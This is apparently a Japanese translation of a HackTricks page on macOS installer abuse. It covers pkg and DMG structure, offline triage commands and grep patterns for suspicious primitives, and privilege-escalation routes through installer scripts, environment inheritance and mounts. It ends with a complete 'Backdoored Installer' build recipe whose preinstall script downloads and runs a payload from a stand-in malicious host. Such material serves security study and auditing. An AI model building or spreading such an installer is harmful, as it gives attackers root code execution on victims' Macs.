# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本情報

macOS **installer package**（`.pkg`ファイルとも呼ばれます）は、macOSで**softwareを配布する**ために使用されるファイル形式です。これらのファイルは、softwareのインストールと正常な実行に必要な**すべてのものを含む箱**のようなものです。

package file自体は、対象の**computerにインストールされるファイルとディレクトリの階層**を格納するarchiveです。また、configuration fileの設定や古いversionのsoftwareのcleanupなど、インストール前後にタスクを実行するための**scripts**を含めることもできます。

### 階層

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customization（title、welcome textなど）およびscript/installation checks
- **PackageInfo (xml)**: Info、install requirements、install location、実行するscriptsへのpaths
- **Bill of materials (bom)**: file permissionsを含む、install、update、removeするfilesのlist
- **Payload (CPIO archive gzip compressed)**: PackageInfoの`install-location`にインストールするfiles
- **Scripts (CPIO archive gzip compressed)**: 実行のためにtemp directoryへextractされるpre and post install scriptsおよびその他のresources

### 解凍
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
インストーラの内容を手動で解凍せずに確認するには、無料ツールの [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) も使用できます。

### Static triage shortcuts

分析が目的の場合は、まずパッケージを `Installer.app` で開くことを**避けてください**。一部のパッケージは、`system.run()` や installer plug-ins などを介して、Installer が開いた時点でコードを実行する可能性があります。そのため、通常はオフラインでの展開から始めるほうが安全です。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basic Information

DMG ファイル、つまり Apple Disk Images は、Apple の macOS がディスクイメージに使用するファイル形式です。DMG ファイルは本質的に**mountable disk image**（独自のファイルシステムを含む）であり、通常は圧縮され、場合によっては暗号化された raw block data を含んでいます。DMG ファイルを開くと、macOS はそれを**物理ディスクであるかのように mount**し、その内容にアクセスできるようにします。

> [!CAUTION]
> **`.dmg`** installer は**非常に多くの形式**をサポートしているため、過去には、その一部に含まれていた vulnerability が悪用され、**kernel code execution**の取得に利用されました。

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG ファイルの hierarchy は内容によって異なる場合があります。ただし、application DMG では通常、次の構造になります。

- Top Level: これは disk image の root です。多くの場合、application と Applications folder への link が含まれています。
- Application (.app): これは実際の application です。macOS では、application は通常、application を構成する多数の個別の file と folder を含む package です。
- Applications Link: これは macOS の Applications folder への shortcut です。これは application を簡単に install できるようにするためのものです。.app file をこの shortcut に drag することで、app を install できます。

## Privesc via pkg abuse

### Execution from public directories

たとえば、pre または post installation script が**`/var/tmp/Installerutil`**から実行され、attacker がその script を control できる場合、その script が実行されるたびに privilege を escalate できます。別の類似した例を示します。<sup>[[1]](#references)[[3]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

これは複数の installer や updater が**root として何かを execute**するために call する[public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)です。この function は、parameter として**execute**する**file**の**path**を受け取ります。しかし、attacker がこの file を**modify**できる場合、root 権限での execution を**abuse**して**privilege を escalate**できます。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
詳細については、この講演を確認してください: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment と shebang の悪用

Modern PackageKit のバグにより、installer scripts は多くの場合、**trusted root code** として実行されながら、攻撃者が制御可能なコンテキストを近くに保持していることが明らかになりました。vendor packages を監査する際は、次の点に特に注意してください:

- `#!/bin/zsh` / `#!/bin/bash` などの Shell interpreters
- `sudo -u $USER`、`launchctl asuser` などの呼び出し、または `$USER`、`$HOME`、`PATH`、`TMPDIR`、相対パスを信頼するロジック
- ユーザーが制御する init files や libraries を読み込む可能性がある、Shell 以外の interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024年のPackageKit root-environment bug（user-initiated installs中の`~/.zshenv` / `~/.bash*`のinheritance）については、[generic macOS privesc page](../macos-privilege-escalation.md)を確認してください。パッケージが**Apple-signed**の場合、`system_installd`が`com.apple.rootless.install.heritable`を保持する可能性があるため、同じscript bugが**SIP/TCC-relevant**になることがあります。[SIP page](../macos-security-protections/macos-sip.md)を参照してください。<sup>[[5]](#references)[[6]](#references)</sup>

### mountによるExecution

installerが`/tmp/fixedname/bla/bla`に書き込む場合、`noowners`で`/tmp/fixedname`上に**mountを作成**し、**installation中に任意のfileをmodify**してinstallation processをabuseできる可能性があります。

この例として**CVE-2021-26089**があり、**periodic scriptをoverwrite**してrootとしてexecutionを取得することに成功しました。詳細については、次のtalkを参照してください: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## malwareとしてのpkg

### Empty Payload

実際のpayloadを含めず、scripts内のmalwareだけで、**pre and post-install scripts**を含む**`.pkg`** fileを生成することが可能です。<sup>[[2]](#references)</sup>

### Distribution xml内のJS

パッケージの**distribution xml** fileに**`<script>`** tagsを追加することが可能で、そのcodeが実行され、**`system.run`**を使用して**commandsをexecute**できます:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

distribution packagesでは、通常、これはtop-levelの`Distribution` fileがexternal scriptsを有効化しているかどうかに依存します。たとえば、`allow-external-scripts="true"`を指定します。そのため、`preinstall` / `postinstall`だけをreviewするのでは不十分です。**Distribution XMLそのもの**に`installation-check` / `volume-check` hooksや、`system.run()` / `system.runOnce()`を直接実行するpathsが含まれている可能性があります。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml 内の script と JS code を使用する悪意のある installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## 参考資料

- [1] [DEF CON 27 - Pkgs のアンパッキング：Macos Installer Packages の内部と一般的なセキュリティ上の欠陥](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: 「macOS Installers のワイルドな世界」 - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - MacOS Installer Packages のアンパッキング](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages の悪用](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit の Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages による SIP の突破](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: 「Mount(ain) of Bugs」 - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS の 1000 個の Installers による Death、そしてすべてが壊れている！](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
